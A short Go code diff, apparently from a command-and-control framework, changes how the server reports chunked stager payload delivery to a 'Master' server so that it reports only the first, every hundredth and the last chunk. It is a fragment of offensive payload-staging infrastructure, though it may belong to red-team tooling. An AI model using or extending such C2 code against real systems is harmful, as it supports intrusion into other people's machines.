@@ -1536,14 +1536,16 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 				cachedSession.LastActivity = time.Now()
 				c2.mutex.Unlock()
 
-				// Report chunk delivery to Master (async, fire-and-forget)
-				go func() {
-					// Use the progress reporting endpoint
-					err := masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
-					if err != nil && c2.debug {
-						logf("[C2] Warning: Failed to report chunk %d to Master: %v", chunkIndex, err)
-					}
-				}()
+				// Report chunk delivery to Master (async, batched reporting)
+				// Only report every 100 chunks, first chunk, or last chunk to reduce Master load
+				if chunkIndex == 0 || chunkIndex%100 == 0 || chunkIndex == cachedSession.TotalChunks-1 {
+					go func() {
+						err := masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
+						if err != nil && c2.debug {
+							logf("[C2] Warning: Failed to report chunk %d to Master: %v", chunkIndex, err)
+						}
+					}()
+				}
 
 				return fmt.Sprintf("CHUNK|%s", chunkData)
 			}
